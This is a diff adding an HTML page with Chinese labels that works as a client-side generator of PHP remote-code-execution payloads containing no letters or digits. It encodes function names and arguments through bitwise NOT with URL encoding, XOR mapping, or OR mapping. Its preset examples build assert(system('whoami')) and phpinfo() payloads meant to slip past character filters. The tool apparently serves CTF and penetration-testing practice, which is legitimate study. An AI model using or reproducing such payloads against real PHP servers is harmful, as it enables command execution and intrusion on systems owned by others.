@@ -1,0 +1,708 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PHP 无字母数字 RCE Payload 生成器</title>
+  <style>
+    :root {
+      --primary: #4263eb;
+      --primary-light: #5a77f5;
+      --secondary: #64748b;
+      --accent: #f59e0b;
+      --success: #10b981;
+      --danger: #ef4444;
+      --light: #f8fafc;
+      --dark: #1e293b;
+      --card-bg: #ffffff;
+      --text-primary: #1e293b;
+      --text-secondary: #64748b;
+      --border: #e2e8f0;
+      --hover: #f1f5f9;
+      --transition: all 0.2s ease;
+    }
+
+    [data-theme="dark"] {
+      --card-bg: #1e293b;
+      --text-primary: #f8fafc;
+      --text-secondary: #94a3b8;
+      --border: #334155;
+      --hover: #2d3748;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background-color: #f1f5f9;
+      background-color: var(--light);
+      color: var(--text-primary);
+      min-height: 100vh;
+      padding: 20px;
+      transition: var(--transition);
+    }
+
+    [data-theme="dark"] body {
+      background-color: #0f172a;
+    }
+
+    header {
+      max-width: 1200px;
+      margin: 0 auto 30px;
+    }
+
+    .header-content {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 15px;
+    }
+
+    .header-text h1 {
+      font-size: 1.8rem;
+      margin-bottom: 8px;
+      color: var(--primary);
+    }
+
+    .header-text p {
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+    }
+
+    .toolbar button {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 8px 12px;
+      cursor: pointer;
+      font-size: 1rem;
+      transition: var(--transition);
+    }
+
+    .toolbar button:hover {
+      background: var(--hover);
+    }
+
+    main {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 25px;
+    }
+
+    @media (min-width: 768px) {
+      main {
+        grid-template-columns: 1fr 1fr;
+      }
+    }
+
+    .card {
+      background: var(--card-bg);
+      border-radius: 12px;
+      padding: 25px;
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+      border: 1px solid var(--border);
+      transition: var(--transition);
+    }
+
+    .controls .row {
+      margin-bottom: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .row-inline {
+      flex-direction: row;
+      align-items: center;
+      justify-content: space-between;
+      gap: 15px;
+    }
+
+    label {
+      font-weight: 500;
+      font-size: 0.9rem;
+      color: var(--text-primary);
+    }
+
+    input, select, textarea {
+      width: 100%;
+      padding: 12px 15px;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      background: var(--card-bg);
+      color: var(--text-primary);
+      font-size: 0.95rem;
+      transition: var(--transition);
+    }
+
+    input:focus, select:focus, textarea:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(66, 99, 235, 0.1);
+    }
+
+    .checkbox-label {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+    }
+
+    #autoSemicolon {
+      width: auto;
+      margin: 0;
+    }
+
+    .button-group {
+      display: flex;
+      gap: 10px;
+    }
+
+    button {
+      padding: 10px 18px;
+      border-radius: 8px;
+      border: none;
+      font-weight: 500;
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: var(--transition);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .primary {
+      background: var(--primary);
+      color: white;
+    }
+
+    .primary:hover {
+      background: var(--primary-light);
+    }
+
+    .secondary {
+      background: var(--hover);
+      color: var(--text-primary);
+    }
+
+    .secondary:hover {
+      background: #e2e8f0;
+    }
+
+    [data-theme="dark"] .secondary:hover {
+      background: #334155;
+    }
+
+    .meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin: 20px 0;
+    }
+
+    .badge {
+      background: var(--hover);
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      color: var(--text-secondary);
+    }
+
+    .accent {
+      background: rgba(245, 158, 11, 0.1);
+      color: var(--accent);
+      font-weight: 500;
+    }
+
+    .examples {
+      margin: 20px 0;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    summary {
+      padding: 12px 15px;
+      cursor: pointer;
+      font-weight: 500;
+      background: var(--hover);
+      transition: var(--transition);
+    }
+
+    summary:hover {
+      background: #e2e8f0;
+    }
+
+    [data-theme="dark"] summary:hover {
+      background: #334155;
+    }
+
+    .examples-list {
+      padding: 15px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .examples-list button {
+      background: transparent;
+      border: 1px solid var(--border);
+      padding: 10px 15px;
+      text-align: left;
+      border-radius: 6px;
+      color: var(--text-primary);
+    }
+
+    .examples-list button:hover {
+      background: var(--hover);
+    }
+
+    .hint {
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+      margin-top: 15px;
+      line-height: 1.5;
+    }
+
+    .note {
+      font-size: 0.8rem;
+      color: var(--accent);
+      margin-top: 5px;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .output-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+
+    .small-button {
+      padding: 6px 12px;
+      font-size: 0.85rem;
+    }
+
+    textarea#output {
+      min-height: 200px;
+      resize: vertical;
+      font-family: 'Consolas', 'Monaco', monospace;
+      white-space: pre;
+      overflow-x: auto;
+    }
+
+    footer {
+      max-width: 1200px;
+      margin: 30px auto 0;
+      padding: 20px 0;
+      text-align: center;
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+      border-top: 1px solid var(--border);
+    }
+
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      padding: 12px 20px;
+      background: var(--dark);
+      color: white;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      opacity: 0;
+      pointer-events: none;
+      transition: var(--transition);
+      border-left: 4px solid var(--primary);
+    }
+
+    .toast.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+
+    .focused {
+      position: relative;
+    }
+
+    .focused::after {
+      content: '';
+      position: absolute;
+      bottom: -2px;
+      left: 0;
+      width: 100%;
+      height: 2px;
+      background: var(--primary);
+      border-radius: 2px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-content">
+      <div class="header-text">
+        <h1> PHP无字母数字 RCE Payload 生成器</h1>
+        <p>纯前端JS：支持 (~) 取反 + urlencode、(^) XOR 映射、(|) OR 映射。</p>
+      </div>
+      <div class="toolbar">
+        <button id="themeToggle" title="切换主题">🌗 主题</button>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <section class="controls card">
+      <div class="row">
+        <label for="method">生成方式</label>
+        <select id="method">
+          <option value="not">(~) 按位取反 + URL 编码</option>
+          <option value="xor">(^) XOR 映射拼接</option>
+          <option value="or">(|) OR 映射拼接</option>
+        </select>
+      </div>
+
+      <div class="row">
+        <label for="funcInput">函数名</label>
+        <input id="funcInput" type="text" value="assert" placeholder="例如：assert" />
+      </div>
+
+      <div class="row">
+        <label for="paramInput">参数/表达式</label>
+        <input id="paramInput" type="text" value="system('whoami')" placeholder="例如：system('whoami') 或 phpinfo();" />
+        <div id="paramHint" class="note hidden">当前为无参，将输出 <code>()</code></div>
+      </div>
+
+      <div class="row row-inline">
+        <label class="checkbox-label">
+          <input id="autoSemicolon" type="checkbox" checked />
+          末尾自动添加分号
+        </label>
+        <div class="button-group">
+          <button id="genBtn" class="primary">生成 Payload</button>
+          <button id="copyBtn">复制</button>
+          <button id="clearBtn" class="secondary" title="清空输入">清空</button>
+        </div>
+      </div>
+
+      <div class="meta">
+        <span class="badge">函数长度: <span id="funcLen">0</span></span>
+        <span class="badge">参数长度: <span id="paramLen">0</span></span>
+        <span class="badge accent">Payload 长度: <span id="payloadLen">0</span></span>
+      </div>
+
+      <details class="examples">
+        <summary>快速示例</summary>
+        <div class="examples-list">
+          <button data-example="not-phpinfo">(~) 测试：phpinfo → (~%..%..)();</button>
+          <button data-example="not-assert-whoami">(~) RCE：assert + system('whoami')</button>
+          <button data-example="xor-assert-whoami">(^) RCE：assert + system('whoami')</button>
+          <button data-example="or-assert-phpinfo">(|) RCE：assert + phpinfo();</button>
+        </div>
+      </details>
+
+      <p class="hint">提示：输入请尽量使用 ASCII 可见字符。非 ASCII 会按低 8 位处理，结果可能与 PHP 行为不一致。</p>
+    </section>
+
+    <section class="output card">
+      <div class="output-header">
+        <label for="output">生成结果</label>
+        <div class="output-actions">
+          <button id="copyBtn2" class="small-button">复制</button>
+        </div>
+      </div>
+      <textarea id="output" rows="8" readonly></textarea>
+    </section>
+  </main>
+
+  <footer>
+    <p>
+      <img src="/images/img/bei.png" 
+             style="width:15px; height:15px; margin-right:6px;" 
+             alt="备案图标">
+        <a href="https://beian.mps.gov.cn/#/query/webSearch?code=32110202000752" 
+           rel="noreferrer" 
+           target="_blank" 
+           class="text-secondary me-4">苏公网安备32110202000752号</a>
+        <span class="text-secondary">&nbsp;&nbsp;|&nbsp;&nbsp;</span>
+        <a href="https://beiancx.miit.gov.cn/#/Integrated/recordQuery" 
+           rel="noreferrer" 
+           target="_blank" 
+           class="text-secondary ms-4">豫ICP备2025148481号</a>
+    </p>
+  </footer>
+
+  <div class="toast" id="toast"></div>
+
+  <script>
+    // 无字母数字 RCE 生成器（纯前端 JS）
+    (function(){
+      const $ = (sel)=>document.querySelector(sel);
+      const methodSel = $('#method');
+      const funcInput = $('#funcInput');
+      const paramInput = $('#paramInput');
+      const autoSemicolon = $('#autoSemicolon');
+      const output = $('#output');
+      const themeToggle = $('#themeToggle');
+      const paramHint = $('#paramHint');
+      const funcLen = $('#funcLen');
+      const paramLen = $('#paramLen');
+      const payloadLen = $('#payloadLen');
+      const toastElement = $('#toast');
+
+      // PHP 按位取反（~）对字节的行为：逐字节取反（0xFF - b）
+      function phpBitwiseNotBytes(str){
+        const bytes = Array.from(new TextEncoder().encode(str));
+        const inverted = bytes.map(b => (~b) & 0xFF);
+        return inverted; // 返回数组 [0..255]
+      }
+
+      // URL 编码为 %XX（大写）
+      function toPercentHex(bytes){
+        return bytes.map(b => '%' + b.toString(16).toUpperCase().padStart(2,'0')).join('');
+      }
+
+      // (~) 方案： ( ~%..%.. )(); 或 ( ~%.. ) ( ~%.. );
+      function buildNotUrlencode(func, param, addSemi){
+        // 函数与参数分别取反并转 %XX
+        const f = toPercentHex(phpBitwiseNotBytes(func));
+        const p = toPercentHex(phpBitwiseNotBytes(param));
+        const suffix = addSemi ? ';' : '';
+        // 若参数为空，应输出空括号 ()，而不是 (~)
+        const right = (param && param.length > 0) ? `(~${p})` : `()`;
+        return `(~${f})${right}${suffix}`;
+      }
+
+      // 生成 XOR 映射：将 ASCII 可见字符 (32..126) 映射到 "'%xx'^'%yy'"
+      function buildXorMap(){
+        const map = {};
+        for(let x=128;x<=255;x++){
+          for(let y=x;y<=255;y++){
+            const r = (x ^ y) & 0xFF;
+            if(r>=32 && r<=126){
+              const ch = String.fromCharCode(r);
+              // 与 PHP dechex 一致，小写 16 进制，不补 0
+              map[ch] = `'${toPct(x)}'^'${toPct(y)}'`;
+            }
+          }
+        }
+        return map;
+      }
+
+      // 生成 OR 映射：将 ASCII 可见字符 (32..126) 映射到 "'%xx'|'%yy'"
+      function buildOrMap(){
+        const map = {};
+        for(let x=32;x<=126;x++){
+          for(let y=32;y<=126;y++){
+            const r = (x | y) & 0xFF;
+            if(r>=32 && r<=126){
+              const ch = String.fromCharCode(r);
+              map[ch] = `'${toPct(x)}'|'${toPct(y)}'`;
+            }
+          }
+        }
+        return map;
+      }
+
+      // 将字节转为 %hex（小写、不补零与 PHP dechex 保持一致）
+      function toPct(n){
+        return '%' + n.toString(16);
+      }
+
+      function replaceByMap(str, map){
+        let out = '';
+        for(const ch of str){
+          if(map[ch]){
+            out += `(${map[ch]}).`;
+          }else{
+            out += ch; // 若无映射，按原字符输出（与参考脚本一致）
+          }
+        }
+        return out.endsWith('.') ? out.slice(0, -1) : out;
+      }
+
+      function buildXorPayload(func, param, addSemi){
+        const map = buildXorMap();
+        const ef = replaceByMap(func, map);
+        const ep = replaceByMap(param, map);
+        return `(${ef})(${ep})${addSemi?';':''}`;
+      }
+
+      function buildOrPayload(func, param, addSemi){
+        const map = buildOrMap();
+        const ef = replaceByMap(func, map);
+        const ep = replaceByMap(param, map);
+        return `(${ef})(${ep})${addSemi?';':''}`;
+      }
+
+      function build(){
+        const method = methodSel.value;
+        const func = funcInput.value || '';
+        const param = paramInput.value || '';
+        const addSemi = !!autoSemicolon.checked;
+        let payload = '';
+
+        if(method === 'not'){
+          payload = buildNotUrlencode(func, param, addSemi);
+        }else if(method === 'xor'){
+          payload = buildXorPayload(func, param, addSemi);
+        }else if(method === 'or'){
+          payload = buildOrPayload(func, param, addSemi);
+        }
+
+        output.value = payload;
+        // 更新长度统计
+        funcLen.textContent = String(func.length);
+        paramLen.textContent = String(param.length);
+        payloadLen.textContent = String(payload.length);
+        // 参数提示
+        if(method === 'not' && param.trim().length === 0){
+          paramHint.classList.remove('hidden');
+        }else{
+          paramHint.classList.add('hidden');
+        }
+        autoResizeOutput();
+      }
+
+      // 复制功能
+      function copyOut(){
+        if(!output.value){ return; }
+        navigator.clipboard?.writeText(output.value).then(()=>{
+          toast('已复制', 'success');
+        }).catch(()=>{
+          // 兜底：选中文本
+          output.focus();
+          output.select();
+          toast('已选中，请手动复制');
+        });
+      }
+
+      // 提示框
+      function toast(msg, type = 'info'){
+        toastElement.textContent = msg;
+        toastElement.className = 'toast show';
+        
+        if (type === 'success') {
+          toastElement.style.borderLeftColor = 'var(--success)';
+        } else {
+          toastElement.style.borderLeftColor = 'var(--primary)';
+        }
+        
+        setTimeout(()=>{
+          toastElement.classList.remove('show');
+          setTimeout(()=>{
+            toastElement.className = 'toast';
+          }, 250);
+        }, 2000);
+      }
+
+      // 绑定示例按钮
+      function bindExamples(){
+        document.querySelectorAll('.examples-list button').forEach(btn=>{
+          btn.addEventListener('click', ()=>{
+            const id = btn.getAttribute('data-example');
+            switch(id){
+              case 'not-phpinfo':
+                methodSel.value = 'not';
+                funcInput.value = 'phpinfo';
+                paramInput.value = '';
+                autoSemicolon.checked = false;
+                break;
+              case 'not-assert-whoami':
+                methodSel.value = 'not';
+                funcInput.value = 'assert';
+                paramInput.value = "system('whoami')";
+                autoSemicolon.checked = true;
+                break;
+              case 'xor-assert-whoami':
+                methodSel.value = 'xor';
+                funcInput.value = 'assert';
+                paramInput.value = "system('whoami')";
+                autoSemicolon.checked = true;
+                break;
+              case 'or-assert-phpinfo':
+                methodSel.value = 'or';
+                funcInput.value = 'assert';
+                paramInput.value = 'phpinfo();';
+                autoSemicolon.checked = true;
+                break;
+            }
+            build();
+          });
+        });
+      }
+
+      // 自动调整输出框高度
+      function autoResizeOutput(){
+        output.style.height = 'auto';
+        output.style.height = Math.min(output.scrollHeight, 600) + 'px';
+      }
+
+      // 事件绑定
+      $('#genBtn').addEventListener('click', build);
+      $('#copyBtn').addEventListener('click', copyOut);
+      $('#copyBtn2').addEventListener('click', copyOut);
+      $('#clearBtn').addEventListener('click', ()=>{
+        funcInput.value = '';
+        paramInput.value = '';
+        build();
+        funcInput.focus();
+      });
+
+      // 输入变化实时更新
+      [methodSel, funcInput, paramInput, autoSemicolon].forEach(el=>{
+        el.addEventListener('change', build);
+        el.addEventListener('input', build);
+      });
+
+      // 主题切换
+      themeToggle.addEventListener('click', ()=>{
+        const isDark = document.documentElement.getAttribute('data-theme') === 'dark';
+        document.documentElement.setAttribute('data-theme', isDark ? 'light' : 'dark');
+        localStorage.setItem('theme', isDark ? 'light' : 'dark');
+        themeToggle.textContent = isDark ? '🌕 主题' : '🌑 主题';
+      });
+
+      // 初始主题设置
+      (function(){
+        const stored = localStorage.getItem('theme');
+        if(stored){
+          document.documentElement.setAttribute('data-theme', stored);
+          themeToggle.textContent = stored === 'dark' ? '🌕 主题' : '🌑 主题';
+        }else{
+          const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+          document.documentElement.setAttribute('data-theme', prefersDark ? 'dark' : 'light');
+          themeToggle.textContent = prefersDark ? '🌕 主题' : '🌑 主题';
+        }
+      })();
+
+      // 输入框焦点样式
+      [funcInput, paramInput].forEach(input => {
+        input.addEventListener('focus', () => {
+          input.parentElement.classList.add('focused');
+        });
+        input.addEventListener('blur', () => {
+          input.parentElement.classList.remove('focused');
+        });
+      });
+
+      // 初始化
+      bindExamples();
+      autoSemicolon.checked = true;
+      build();
+      autoResizeOutput();
+    })();
+  </script>
+</body>
+</html>
